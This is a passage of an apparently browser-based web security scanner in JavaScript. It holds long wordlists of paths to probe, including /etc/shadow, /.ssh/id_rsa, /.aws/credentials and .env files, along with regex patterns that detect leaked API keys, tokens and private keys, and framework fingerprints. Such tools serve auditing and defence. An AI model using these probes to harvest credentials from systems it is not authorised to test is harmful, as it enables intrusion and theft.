

window.addEventListener('error', (e) => {
  try {
    const t = document.getElementById('terminal');
    if (t) {
      const span = document.createElement('span');
      span.className = 't-line t-err';
      span.textContent = '[ERR] ' + (e.message || 'unknown error') + (e.filename ? ' @ ' + e.filename.split('/').pop() + ':' + e.lineno : '');
      t.appendChild(span);
      t.scrollTop = t.scrollHeight;
    }
  } catch (_) {}
});

const $ = (sel) => document.querySelector(sel);
const $safe = (sel, fn) => { const el = document.querySelector(sel); if (el) fn(el); };
const status = (msg, type = '') => {
  const s = document.querySelector('#status');
  if (!s) return;
  s.textContent = msg || '';
  s.className = 'status ' + type;
};

const COMMON_PATHS = [
  '/admin', '/admin/', '/admin/login', '/admin/dashboard', '/admin/debug', '/admin/users', '/admin/api', '/admin/console', '/admin/settings', '/admin/panel', '/admin/secret',
  '/administrator', '/administrator/', '/manage', '/management', '/manager', '/manager/html', '/manager/status',
  '/api', '/api/', '/api/v1', '/api/v1/', '/api/v2', '/api/v2/', '/api/v3', '/api/v4', '/api/latest', '/api/beta',
  '/api/v1/admin', '/api/v1/admin/debug', '/api/v1/users', '/api/v1/config', '/api/v1/auth', '/api/v1/login', '/api/v1/me', '/api/v1/profile', '/api/v1/orders', '/api/v1/payments', '/api/v1/keys',
  '/api/v2/admin', '/api/admin', '/api/debug', '/api/internal', '/api/private', '/api/users', '/api/auth', '/api/login', '/api/me', '/api/profile', '/api/orders', '/api/balance',
  '/api/docs', '/api/swagger', '/api/openapi', '/api-docs', '/v3/api-docs', '/api/spec', '/api/schema',
  '/swagger', '/swagger-ui', '/swagger-ui/', '/openapi.json', '/swagger.json', '/swagger-ui.html', '/swagger-resources', '/redoc', '/rapidoc',
  '/.env', '/.env.local', '/.env.production', '/.env.development', '/.env.dev', '/.env.staging', '/.env.test', '/.env.example', '/.env.bak', '/.env.old', '/.env.save',
  '/.git', '/.git/', '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD', '/.git/logs/refs/heads/main', '/.git/refs/heads/master', '/.git/refs/heads/main', '/.git/COMMIT_EDITMSG', '/.git/description',
  '/.gitignore', '/.gitattributes', '/.gitlab-ci.yml', '/.github/workflows',
  '/.svn', '/.svn/entries', '/.svn/wc.db', '/.hg', '/.hg/store', '/.bzr', '/.cvs',
  '/.DS_Store', '/.htaccess', '/.htpasswd', '/.idea', '/.vscode', '/.vscode/settings.json',
  '/backup', '/backup/', '/backup.zip', '/backup.tar.gz', '/backup.tar', '/backup.rar', '/backup.7z', '/backup.sql', '/backup.sql.gz', '/backup.bak', '/backup.old',
  '/db.sql', '/dump.sql', '/data.sql', '/database.sql', '/db.sqlite', '/db.sqlite3', '/database.db', '/db.json', '/data.json',
  '/config', '/config/', '/config.json', '/config.yml', '/config.yaml', '/config.php', '/config.ini', '/config.xml', '/config.toml', '/configuration.php',
  '/wp-config.php', '/wp-config.bak', '/wp-config.php.bak', '/wp-config.php.old', '/wp-config.php.save', '/wp-config.php.swp', '/wp-config.txt',
  '/phpinfo.php', '/info.php', '/test.php', '/php.ini', '/phpmyadmin', '/phpmyadmin/', '/pma', '/pma/', '/myadmin', '/sqlmanager', '/dbadmin',
  '/server-status', '/server-info', '/status', '/health', '/healthz', '/livez', '/readyz', '/ping', '/version',
  '/actuator', '/actuator/env', '/actuator/health', '/actuator/heapdump', '/actuator/mappings', '/actuator/loggers', '/actuator/beans', '/actuator/conditions', '/actuator/configprops', '/actuator/threaddump', '/actuator/metrics', '/actuator/info', '/actuator/auditevents', '/actuator/httptrace',
  '/debug', '/debug/pprof', '/debug/pprof/', '/debug/pprof/heap', '/debug/pprof/profile', '/debug/pprof/goroutine', '/debug/vars', '/_debug', '/_profiler', '/_profiler/phpinfo',
  '/console', '/h2-console', '/jolokia', '/jolokia/list', '/jmx-console', '/web-console', '/admin-console',
  '/wp-admin', '/wp-admin/', '/wp-login.php', '/wp-content/uploads/', '/wp-content/debug.log', '/wp-json', '/wp-json/wp/v2/users', '/wp-json/wp/v2/posts', '/xmlrpc.php',
  '/robots.txt', '/sitemap.xml', '/sitemap_index.xml', '/security.txt', '/.well-known/security.txt', '/.well-known/openid-configuration', '/.well-known/oauth-authorization-server',
  '/graphql', '/graphiql', '/playground', '/altair', '/voyager', '/api/graphql', '/v1/graphql', '/query',
  '/metrics', '/prometheus', '/_metrics', '/grafana', '/kibana', '/elasticsearch',
  '/webpack.config.js', '/package.json', '/package-lock.json', '/yarn.lock', '/pnpm-lock.yaml', '/composer.json', '/composer.lock', '/Gemfile', '/Gemfile.lock', '/requirements.txt', '/Pipfile', '/Pipfile.lock', '/go.mod', '/go.sum',
  '/storage/logs/laravel.log', '/log/error.log', '/logs/access.log', '/logs/error.log', '/logs/app.log', '/error_log', '/access_log', '/app.log', '/debug.log',
  '/.aws/credentials', '/.aws/config', '/.ssh/id_rsa', '/.ssh/id_rsa.pub', '/.ssh/authorized_keys', '/.ssh/known_hosts', '/.npmrc', '/.netrc', '/.dockerenv', '/.dockercfg',
  '/.kubernetes/config', '/.kube/config', '/credentials', '/credentials.json', '/secrets', '/secrets.json', '/secrets.yml',
  '/test', '/test/', '/tests', '/dev', '/dev/', '/staging', '/qa', '/uat', '/sandbox', '/preview',
  '/admin.php', '/login.php', '/login', '/signin', '/auth/login', '/auth/signin', '/upload.php', '/uploads/', '/files/', '/static/', '/assets/',
  '/CHANGELOG', '/CHANGELOG.md', '/README', '/README.md', '/LICENSE', '/AUTHORS', '/CONTRIBUTORS', '/TODO',
  '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml', '/docker-compose.override.yml', '/Procfile', '/Makefile',
  '/.replit', '/replit.nix', '/render.yaml', '/vercel.json', '/netlify.toml', '/firebase.json',
  '/server', '/server.js', '/app.js', '/index.js', '/main.py', '/app.py', '/manage.py',
  '/.well-known/apple-app-site-association', '/.well-known/assetlinks.json',
  '/cgi-bin/', '/cgi-bin/test-cgi', '/cgi-bin/printenv', '/cgi-bin/php', '/cgi-bin/php5',
  '/old', '/old/', '/new', '/new/', '/temp', '/temp/', '/tmp', '/tmp/', '/cache', '/cache/',
  '/install', '/install.php', '/setup', '/setup.php', '/installer', '/installer.php',
  '/.travis.yml', '/.circleci/config.yml', '/buildspec.yml', '/cloudbuild.yaml',
  '/elmah.axd', '/trace.axd', '/web.config', '/Web.config', '/global.asax',
];

const DEEP_PATHS = [
  '/_vti_bin/', '/_vti_pvt/', '/_vti_cnf/', '/_private/', '/cgi-bin/awstats.pl', '/cgi-bin/test.cgi', '/cgi-bin/php.cgi', '/cgi-bin/perl', '/cgi-bin/.env',
  '/admin/config.php', '/admin/install.php', '/admin/setup.php', '/admin/login.html', '/admin/index.php', '/admin/index.html', '/admin/admin.php', '/admin/main.php', '/admin/home.php', '/admin/controller.php',
  '/admin/users.php', '/admin/user.php', '/admin/users.html', '/admin/userlist', '/admin/system', '/admin/system.php', '/admin/system.html', '/admin/dashboard.php', '/admin/dashboard.html', '/admin/cp', '/admin/cp.php', '/admin/cp.html',
  '/cp', '/cpanel', '/control', '/controlpanel', '/controlpanel.php', '/control.php', '/manage.php', '/manager.php', '/sysadmin', '/superadmin', '/super-admin', '/owner', '/root',
  '/api/v1/admin/users', '/api/v1/admin/config', '/api/v1/admin/keys', '/api/v1/admin/logs', '/api/v1/admin/health', '/api/v1/admin/stats', '/api/v1/admin/metrics', '/api/v1/admin/backup',
  '/api/internal/users', '/api/internal/config', '/api/internal/keys', '/api/internal/logs', '/api/internal/admin', '/api/internal/health',
  '/api/private/users', '/api/private/config', '/api/private/admin', '/api/private/keys', '/api/private/logs',
  '/api/test', '/api/test/users', '/api/test/admin', '/api/staging', '/api/dev', '/api/qa', '/api/uat', '/api/beta', '/api/preview',
  '/api/secret', '/api/keys', '/api/tokens', '/api/webhooks', '/api/oauth', '/api/oauth/token', '/api/oauth2', '/api/oauth2/token', '/api/jwt', '/api/session', '/api/sessions',
  '/api/upload', '/api/uploads', '/api/file', '/api/files', '/api/download', '/api/downloads', '/api/export', '/api/import', '/api/backup', '/api/restore',
  '/api/v1/upload', '/api/v1/download', '/api/v1/export', '/api/v1/import', '/api/v1/backup', '/api/v1/restore', '/api/v1/file', '/api/v1/files',
  '/v1/users', '/v1/admin', '/v1/auth', '/v1/login', '/v1/logout', '/v1/me', '/v1/profile', '/v1/orders', '/v1/payments', '/v1/keys', '/v1/secrets',
  '/v2/users', '/v2/admin', '/v2/auth', '/v2/login', '/v2/me', '/v2/profile', '/v2/orders', '/v2/payments', '/v2/keys',
  '/v3/users', '/v3/admin', '/v3/auth', '/v4/users', '/v4/admin',
  '/auth/oauth', '/auth/oauth/token', '/auth/oauth2', '/auth/oauth2/token', '/auth/saml', '/auth/saml/sso', '/auth/saml/metadata', '/auth/openid', '/auth/openid-connect',
  '/oauth', '/oauth/token', '/oauth/authorize', '/oauth/callback', '/oauth2', '/oauth2/token', '/oauth2/authorize', '/oauth2/callback',
  '/.well-known/jwks.json', '/.well-known/oauth2-discovery', '/.well-known/webfinger', '/.well-known/host-meta', '/.well-known/nodeinfo', '/.well-known/change-password', '/.well-known/apple-developer-merchantid-domain-association',
  '/.well-known/pki-validation/', '/.well-known/acme-challenge/', '/.well-known/dnt-policy.txt', '/.well-known/gpc.json',
  '/setup', '/setup/index.php', '/install', '/install/index.php', '/installer', '/installer/index.php', '/installation', '/installation.php',
  '/upload/', '/uploads/', '/files/', '/file/', '/media/', '/images/', '/img/', '/static/', '/public/', '/assets/', '/dist/', '/build/', '/.next/', '/.nuxt/', '/.svelte-kit/',
  '/.env.json', '/.env.yaml', '/.env.yml', '/env.json', '/env.js', '/env.ts',
  '/secrets.json', '/secrets.yml', '/secrets.yaml', '/secrets.env', '/credentials.json', '/credentials.yml', '/credentials.yaml',
  '/keys.json', '/keys.txt', '/keys.env', '/api-keys.txt', '/api-keys.json', '/tokens.json', '/tokens.txt',
  '/private.key', '/private.pem', '/server.key', '/server.pem', '/cert.pem', '/cert.key', '/ssl.key', '/ssl.pem',
  '/id_rsa', '/id_rsa.pub', '/id_dsa', '/id_ecdsa', '/id_ed25519', '/known_hosts', '/authorized_keys',
  '/.bash_history', '/.zsh_history', '/.history', '/.mysql_history', '/.psql_history', '/.python_history',
  '/.bashrc', '/.zshrc', '/.profile', '/.bash_profile', '/.zprofile',
  '/.config/', '/.config/git', '/.config/aws', '/.config/gcloud', '/.config/kube',
  '/var/log/', '/var/log/syslog', '/var/log/auth.log', '/var/log/nginx/access.log', '/var/log/nginx/error.log', '/var/log/apache2/access.log', '/var/log/apache2/error.log', '/var/log/mysql/mysql.log',
  '/proc/self/environ', '/proc/self/cmdline', '/proc/version', '/proc/cpuinfo', '/proc/meminfo',
  '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname', '/etc/motd', '/etc/issue', '/etc/group', '/etc/sudoers',
  '/admin/.git/', '/admin/.env', '/api/.env', '/api/.git/', '/app/.env', '/app/.git/', '/src/.env', '/dist/.env', '/build/.env',
  '/composer/installed.json', '/vendor/', '/vendor/composer/installed.json', '/node_modules/', '/node_modules/.package-lock.json',
  '/jenkins', '/jenkins/', '/jenkins/script', '/jenkins/login', '/jenkins/manage', '/jenkins/people', '/jenkins/configure',
  '/sonar', '/sonarqube', '/gitlab', '/gitlab/', '/gitea', '/gitea/', '/bitbucket', '/bitbucket/',
  '/grafana', '/grafana/', '/grafana/login', '/grafana/api/health', '/grafana/api/datasources',
  '/kibana', '/kibana/', '/kibana/app/kibana', '/kibana/api/status',
  '/elasticsearch', '/elasticsearch/_cat/indices', '/_cat/indices', '/_cluster/health', '/_cluster/stats', '/_nodes',
  '/redis', '/redis/info', '/redis-cli', '/memcached', '/memcache',
  '/portainer', '/portainer/', '/rancher', '/rancher/', '/dockerui', '/dockerui/',
  '/airflow', '/airflow/', '/airflow/admin', '/airflow/login',
  '/superset', '/superset/', '/superset/welcome', '/superset/login',
  '/metabase', '/metabase/', '/metabase/api/health', '/metabase/api/session',
  '/strapi', '/strapi/', '/strapi/admin', '/strapi/admin/login',
  '/keycloak', '/keycloak/', '/keycloak/admin', '/keycloak/auth', '/auth/realms/master',
  '/vault', '/vault/', '/vault/ui', '/v1/sys/health', '/v1/sys/seal-status',
  '/consul', '/consul/', '/consul/v1/status/leader', '/consul/v1/agent/self',
  '/nomad', '/nomad/', '/nomad/v1/status/leader',
  '/etcd', '/etcd/v2/keys', '/etcd/v2/stats/self',
  '/zookeeper', '/zookeeper/admin',
  '/api/healthz', '/api/livez', '/api/readyz', '/api/metrics',
  '/healthcheck', '/health-check', '/health/check', '/check', '/ready', '/alive',
  '/.svn/wc.db', '/.svn/format', '/.git/objects/', '/.git/packed-refs', '/.git/info/refs',
  '/sitemap.txt', '/sitemap.json', '/sitemap1.xml', '/sitemap-index.xml', '/sitemap_news.xml', '/sitemap_pages.xml',
  '/feed', '/feed/', '/rss', '/rss.xml', '/atom.xml', '/feed.xml',
  '/error', '/error.log', '/error.html', '/errors', '/errors.log',
  '/.env~', '/config~', '/config.php~', '/index.php~', '/index.html~', '/.htaccess~',
  '/.bak', '/.old', '/.swp', '/.tmp',
  '/index.php.bak', '/index.html.bak', '/login.php.bak', '/admin.php.bak', '/config.php.bak',
  '/admin.zip', '/admin.tar.gz', '/site.zip', '/site.tar.gz', '/website.zip', '/source.zip', '/src.zip', '/code.zip',
  '/db_backup.sql', '/database_backup.sql', '/users.sql', '/dump.tar.gz', '/dump.zip',
];

const SECRET_REGEXES = [
  { name: 'AWS Access Key ID', re: /\bAKIA[0-9A-Z]{16}\b/g },
  { name: 'AWS Secret Key', re: /(?<![A-Za-z0-9])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/g, validator: (m, ctx) => /aws|secret/i.test(ctx) },
  { name: 'AWS Session Token', re: /\bAWSSTT[A-Za-z0-9/+=]{100,}\b/g },
  { name: 'Google API Key', re: /\bAIza[0-9A-Za-z\-_]{35}\b/g },
  { name: 'Google OAuth Token', re: /\bya29\.[0-9A-Za-z\-_]+\b/g },
  { name: 'GCP Service Account', re: /"type"\s*:\s*"service_account"/g },
  { name: 'Stripe Live Key', re: /\bsk_live_[0-9a-zA-Z]{24,}\b/g },
  { name: 'Stripe Test Key', re: /\bsk_test_[0-9a-zA-Z]{24,}\b/g },
  { name: 'Stripe Publishable Key', re: /\bpk_(live|test)_[0-9a-zA-Z]{24,}\b/g },
  { name: 'GitHub Token', re: /\bgh[pousr]_[A-Za-z0-9_]{36,255}\b/g },
  { name: 'GitHub Fine-grained Token', re: /\bgithub_pat_[A-Za-z0-9_]{82}\b/g },
  { name: 'Slack Token', re: /\bxox[abposr]-[0-9A-Za-z-]{10,}\b/g },
  { name: 'Slack Webhook', re: /\bhttps:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+\b/g },
  { name: 'Discord Webhook', re: /\bhttps:\/\/(?:discord|discordapp)\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+\b/g },
  { name: 'Twilio API Key', re: /\bSK[0-9a-fA-F]{32}\b/g },
  { name: 'SendGrid Key', re: /\bSG\.[A-Za-z0-9_-]{16,32}\.[A-Za-z0-9_-]{16,64}\b/g },
  { name: 'Mailgun Key', re: /\bkey-[0-9a-zA-Z]{32}\b/g },
  { name: 'Heroku API Key', re: /\b[hH]eroku["'\s:=]{0,5}[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b/g },
  { name: 'JWT', re: /\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b/g },
  { name: 'Private Key Block', re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/g },
  { name: 'Firebase Config (apiKey)', re: /apiKey["'\s:=]{1,5}["'][A-Za-z0-9_-]{30,}["']/g },
  { name: 'Generic Bearer Token', re: /\bBearer\s+[A-Za-z0-9._\-+/=]{20,}\b/g },
  { name: 'OpenAI Key', re: /\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b/g },
  { name: 'OpenAI Key v2', re: /\bsk-proj-[A-Za-z0-9_-]{40,}\b/g },
  { name: 'Anthropic Key', re: /\bsk-ant-[A-Za-z0-9_-]{40,}\b/g },
  { name: 'Cloudflare Token', re: /\b[A-Za-z0-9_-]{40}\b(?=.{0,30}cloudflare)/gi },
  { name: 'NPM Token', re: /\bnpm_[A-Za-z0-9]{36}\b/g },
  { name: 'Datadog API Key', re: /\b[0-9a-f]{32}\b(?=.{0,30}datadog)/gi },
  { name: 'DigitalOcean Token', re: /\bdop_v1_[a-f0-9]{64}\b/g },
  { name: 'Shopify Access Token', re: /\bshpat_[a-fA-F0-9]{32}\b/g },
  { name: 'Shopify Custom App', re: /\bshpca_[a-fA-F0-9]{32}\b/g },
  { name: 'Azure Connection String', re: /DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g },
  { name: 'Azure SAS Token', re: /\bsv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[A-Za-z0-9%+/=]{30,}/g },
  { name: 'Algolia API Key', re: /\b[a-f0-9]{32}\b(?=.{0,40}algolia)/gi },
  { name: 'Mapbox Token', re: /\bpk\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b/g },
  { name: 'Pusher App Key', re: /\b[a-f0-9]{20}\b(?=.{0,30}pusher)/gi },
  { name: 'Paypal Client Secret', re: /\bEL[a-zA-Z0-9_-]{60,}\b(?=.{0,30}paypal)/gi },
  { name: 'Telegram Bot Token', re: /\b\d{8,10}:[A-Za-z0-9_-]{35}\b/g },
  { name: 'HuggingFace Token', re: /\bhf_[A-Za-z0-9]{34}\b/g },
  { name: 'Replicate Token', re: /\br8_[A-Za-z0-9]{40}\b/g },
  { name: 'Hardcoded Password', re: /(?:password|passwd|pwd|pass)\s*[:=]\s*["'][^"']{8,}["']/gi, validator: (m, ctx) => !/example|placeholder|test|your_/i.test(m) },
  { name: 'Database Connection String', re: /(?:mongodb|postgresql|mysql|redis):\/\/[^:]+:[^@]+@[^\s"']+/gi },
  { name: 'PyPI Token', re: /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}\b/g },
  { name: 'npm Token (new)', re: /\bnpm_[A-Za-z0-9]{36,}\b/g },
  { name: 'Twilio Account SID', re: /\bAC[0-9a-fA-F]{32}\b/g },
  { name: 'Twilio Auth Token', re: /\b[0-9a-fA-F]{32}\b(?=.{0,30}twilio)/gi },
  { name: 'SendGrid v3 Key', re: /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g },
  { name: 'Mailchimp API Key', re: /\b[0-9a-f]{32}-us\d{1,2}\b/g },
  { name: 'Braintree Token', re: /\bbraintree[_-]?(?:sandbox|production)[_-]?[a-z0-9]{16,}\b/gi, validator: (m, ctx) => /braintree/i.test(ctx) },
  { name: 'Square Access Token', re: /\bEAAAE[A-Za-z0-9_-]{55,}\b/g },
  { name: 'Cloudinary URL', re: /cloudinary:\/\/[0-9]+:[A-Za-z0-9_-]+@[a-z0-9]+/gi },
  { name: 'Firebase Server Key', re: /\bAAAA[A-Za-z0-9_-]{100,}\b(?=.{0,50}firebase|fcm)/gi },
  { name: 'Supabase Key', re: /\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b(?=.{0,100}supabase)/gi },
  { name: 'PlanetScale Token', re: /\bpscale_tkn_[A-Za-z0-9_]{40,}\b/g },
  { name: 'MongoDB Atlas URI', re: /mongodb\+srv:\/\/[^:]+:[^@]+@[a-z0-9.-]+\.mongodb\.net/gi },
  { name: 'Databricks Token', re: /\bdapi[A-Za-z0-9]{32}\b/g },
  { name: 'Snowflake Private Key', re: /-----BEGIN (?:ENCRYPTED )?PRIVATE KEY-----[\s\S]+?-----END (?:ENCRYPTED )?PRIVATE KEY-----/g },
  { name: 'Auth0 Client Secret', re: /\b[A-Za-z0-9_-]{64}\b(?=.{0,50}auth0|client_secret)/gi },
  { name: 'Okta API Token', re: /\b00[A-Za-z0-9_-]{40}\b(?=.{0,30}okta)/gi },
  { name: 'Linear API Key', re: /\blin_api_[A-Za-z0-9]{40}\b/g },
  { name: 'Zendesk Token', re: /\b[A-Za-z0-9]{40,}\b(?=.{0,30}zendesk)/gi, validator: (m, ctx) => /zendesk/i.test(ctx) },
  { name: 'Intercom Secret', re: /\b[A-Za-z0-9_]{40,}\b(?=.{0,30}intercom)/gi, validator: (m, ctx) => /intercom/i.test(ctx) },
  { name: 'Segment Write Key', re: /\b[A-Za-z0-9]{20,}\b(?=.{0,30}segment\.write_key|segment\.io)/gi },
  { name: 'LaunchDarkly SDK Key', re: /\bsdk-[A-Za-z0-9_-]{40,}\b/g },
  { name: 'Sentry DSN', re: /https:\/\/[0-9a-f]{32}@o\d+\.ingest\.sentry\.io\/\d+/g },
  { name: 'Rollbar Token', re: /\b[0-9a-f]{32}\b(?=.{0,30}rollbar)/gi },
  { name: 'Bugsnag API Key', re: /\b[0-9a-f]{32}\b(?=.{0,30}bugsnag)/gi },
  { name: 'Datadog App Key', re: /\b[0-9a-f]{40}\b(?=.{0,30}datadog)/gi },
  { name: 'New Relic License Key', re: /\b[A-Za-z0-9]{40}\b(?=.{0,30}new.?relic|newrelic)/gi },
  { name: 'PagerDuty Integration Key', re: /\b[A-Za-z0-9+/]{20,}\b(?=.{0,30}pagerduty)/gi },
  { name: 'Vault Token', re: /\bhvs\.[A-Za-z0-9_-]{24,}\b|\bs\.[\w-]{24,}\b(?=.{0,30}vault)/g },
  { name: 'Vercel Token', re: /\b[A-Za-z0-9]{24}\b(?=.{0,30}vercel)/gi, validator: (m, ctx) => /vercel/i.test(ctx) },
  { name: 'Netlify Token', re: /\b[A-Za-z0-9_-]{40,}\b(?=.{0,30}netlify)/gi, validator: (m, ctx) => /netlify/i.test(ctx) },
  { name: 'Cloudflare API Key', re: /\b[0-9a-f]{37}\b(?=.{0,30}cloudflare)/gi },
  { name: 'SSH Private Key (inline)', re: /ssh-rsa\s+AAAA[A-Za-z0-9+/=]+/g },
  { name: 'Generic Secret Variable', re: /(?:secret|api_key|api-key|access_key|access-key|private_key|auth_key|auth-key)\s*[:=]\s*["'][A-Za-z0-9_\-+/=]{16,}["']/gi, validator: (m) => !/example|placeholder|test|your_/i.test(m) },
  { name: 'Bearer in JS code', re: /['"]\s*Bearer\s+[A-Za-z0-9._\-+/=]{30,}\s*['"]/g },
  { name: 'Webhook Secret', re: /(?:webhook|whsec)[_-]?secret\s*[:=]\s*["'][A-Za-z0-9_\-+/=]{16,}["']/gi },
  { name: 'Airtable Key', re: /\bkeyAirtable[A-Za-z0-9]{10,}\b|\bpat[A-Za-z0-9]{14}\.[A-Za-z0-9]{64}\b/g },
  { name: 'Notion Token', re: /\bsecret_[A-Za-z0-9]{43}\b/g },
  { name: 'Asana Token', re: /\b[0-9]\/[0-9]{16}:[0-9a-f]{32}\b/g },
  { name: 'Azure Client Secret', re: /(?:client.?secret|clientSecret)\s*[:=]\s*["'][A-Za-z0-9._~-]{30,}["']/gi },
  { name: 'Elastic API Key', re: /\bApiKey\s+[A-Za-z0-9+/=]{40,}\b/g },
  { name: 'Fastly Token', re: /\b[A-Za-z0-9]{32}\b(?=.{0,30}fastly)/gi },
  { name: 'JDBC Connection', re: /jdbc:[a-z]+:\/\/[^:]+:[^@]+@[^\s"']+/gi },
  { name: 'Typeform Token', re: /\btfp_[A-Za-z0-9_-]{40,}\b/g },
  { name: 'Linear Personal Key', re: /\blin_api_[A-Za-z0-9]{40,}\b/g },
  { name: 'Postman API Key', re: /\bPMPK-[A-Za-z0-9-]{36}\b/g },
  { name: 'Figma Token', re: /\bfig-[A-Za-z0-9_-]{40,}\b/g },
  { name: 'Salesforce Token', re: /\b[A-Za-z0-9!._]{80,}\b(?=.{0,30}salesforce|access.?token)/gi, validator: (m, ctx) => /salesforce/i.test(ctx) },
  { name: 'Shopify Storefront', re: /\bshpss_[a-fA-F0-9]{32}\b/g },
  { name: 'WooCommerce Key', re: /\bck_[a-f0-9]{40}\b|\bcs_[a-f0-9]{40}\b/g },
  { name: 'Zoom JWT', re: /\beyJ[A-Za-z0-9._-]+\b(?=.{0,30}zoom)/gi },
  { name: 'Facebook App Secret', re: /(?:appsecret|app_secret|facebook)\s*[:=]\s*["'][0-9a-f]{32}["']/gi },
  { name: 'Twitter API Secret', re: /(?:twitter|consumer)[_-]?(?:api|app)?[_-]?(?:key|secret)\s*[:=]\s*["'][A-Za-z0-9]{30,}["']/gi },
  { name: 'Instagram Token', re: /\bIGQV[A-Za-z0-9_-]{100,}\b/g },
  { name: 'LinkedIn Client Secret', re: /(?:linkedin)[_-]?client[_-]?secret\s*[:=]\s*["'][A-Za-z0-9]{16,}["']/gi },
  { name: 'HashiCorp Vault', re: /\bhvb\.[A-Za-z0-9_-]{24,}\b/g },
  { name: 'Grafana API Key', re: /\beyJrIjoi[A-Za-z0-9+/=]{40,}/g },
  { name: 'SonarQube Token', re: /\bsqa_[a-f0-9]{40}\b|\bsqp_[a-f0-9]{40}\b/g },
  { name: 'Artifactory Token', re: /\bAKCp[A-Za-z0-9]{70,}\b/g },
  { name: 'CircleCI Token', re: /\b[0-9a-f]{40}\b(?=.{0,30}circleci)/gi },
  { name: 'Travis CI Token', re: /\b[A-Za-z0-9_-]{22}\b(?=.{0,30}travis)/gi },
  { name: 'Docker Hub Token', re: /\bdckr_pat_[A-Za-z0-9_-]{27}\b/g },
  { name: 'GCP Refresh Token', re: /\b1\/\/[A-Za-z0-9_-]{40,}\b(?=.{0,30}google|gcp)/gi },
  { name: 'TOTP / OTP Secret', re: /(?:totp|otp|mfa)[_-]?secret\s*[:=]\s*["'][A-Z2-7]{16,32}["']/gi },
  { name: 'Cookie Session Secret', re: /(?:cookie|session)[_-]?secret\s*[:=]\s*["'][A-Za-z0-9_\-+/=]{16,}["']/gi, validator: (m) => !/example|placeholder/i.test(m) },
  { name: 'Django Secret Key', re: /SECRET_KEY\s*=\s*['"][A-Za-z0-9!@#$%^&*()_+=-]{30,}['"]/g },
  { name: 'Rails Secret Key Base', re: /secret_key_base\s*[:=]\s*['"]\s*[a-f0-9]{128}['"]/gi },
  { name: 'Laravel APP_KEY', re: /APP_KEY\s*=\s*base64:[A-Za-z0-9+/=]{44}/g },
  { name: 'Encryption Key Hex', re: /(?:encryption|cipher)[_-]?key\s*[:=]\s*["'][0-9a-fA-F]{32,}["']/gi, validator: (m) => !/example|placeholder/i.test(m) },
  { name: 'Pinecone API Key', re: /\b[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\b(?=.{0,30}pinecone)/gi },
  { name: 'Cohere API Key', re: /\b[A-Za-z0-9]{40}\b(?=.{0,30}cohere)/gi },
  { name: 'Mistral API Key', re: /\b[A-Za-z0-9]{32}\b(?=.{0,30}mistral)/gi },
  { name: 'OpenRouter Key', re: /\bsk-or-v1-[A-Za-z0-9_-]{64}\b/g },
  { name: 'ElevenLabs Key', re: /\b[0-9a-f]{32}\b(?=.{0,30}elevenlabs)/gi },
];

const TECH_SIGNATURES = [
  { name: 'WordPress', test: (h, b) => /wp-content|wp-includes|wordpress/i.test(b) || /wp-json/.test(b) },
  { name: 'Next.js', test: (h, b) => /__NEXT_DATA__|_next\/static/i.test(b) },
  { name: 'Nuxt.js', test: (h, b) => /__NUXT__|_nuxt\//i.test(b) },
  { name: 'React', test: (h, b) => /\bdata-reactroot\b|\b__reactContainer\$/i.test(b) || /react(-dom)?\.production/i.test(b) },
  { name: 'Vue', test: (h, b) => /v-(?:if|for|model|bind)|__vue__|data-v-[0-9a-f]{8}/i.test(b) },
  { name: 'Angular', test: (h, b) => /ng-version|ng-app|\bplatformBrowser\b/i.test(b) },
  { name: 'Svelte', test: (h, b) => /svelte-[0-9a-z]{6,}|__svelte/i.test(b) },
  { name: 'Express', test: (h) => /express/i.test(h['x-powered-by'] || '') },
  { name: 'PHP', test: (h) => /\bphp\b/i.test(h['x-powered-by'] || '') || /PHPSESSID/i.test(h['set-cookie'] || '') },
  { name: 'Laravel', test: (h, b) => /laravel_session|XSRF-TOKEN/i.test((h['set-cookie'] || '') + b) },
  { name: 'Django', test: (h, b) => /csrftoken|sessionid=/i.test(h['set-cookie'] || '') || /__admin_media_prefix__/i.test(b) },
  { name: 'Ruby on Rails', test: (h) => /\b_session\b/i.test(h['set-cookie'] || '') || /rails/i.test(h['x-runtime'] || '') },
  { name: 'ASP.NET', test: (h) => /asp\.net/i.test(h['x-powered-by'] || '') || /ASP\.NET_SessionId/i.test(h['set-cookie'] || '') },
  { name: 'Cloudflare', test: (h) => 'cf-ray' in h || /cloudflare/i.test(h['server'] || '') },
  { name: 'Vercel', test: (h) => 'x-vercel-id' in h || /vercel/i.test(h['server'] || '') },
  { name: 'Netlify', test: (h) => /netlify/i.test(h['server'] || '') || 'x-nf-request-id' in h },
  { name: 'AWS CloudFront', test: (h) => /cloudfront/i.test(h['server'] || '') || 'x-amz-cf-id' in h },
  { name: 'Nginx', test: (h) => /nginx/i.test(h['server'] || '') },
  { name: 'Apache', test: (h) => /apache/i.test(h['server'] || '') },
  { name: 'IIS', test: (h) => /iis/i.test(h['server'] || '') },
  { name: 'Shopify', test: (h, b) => /cdn\.shopify\.com|shopify-section/i.test(b) || /shopify/i.test(h['x-shopify-stage'] || '') },
  { name: 'jQuery', test: (h, b) => /jquery(?:[-.]\d|\.min)/i.test(b) },
  { name: 'Tailwind CSS', test: (h, b) => /\btw-|tailwind/i.test(b) },
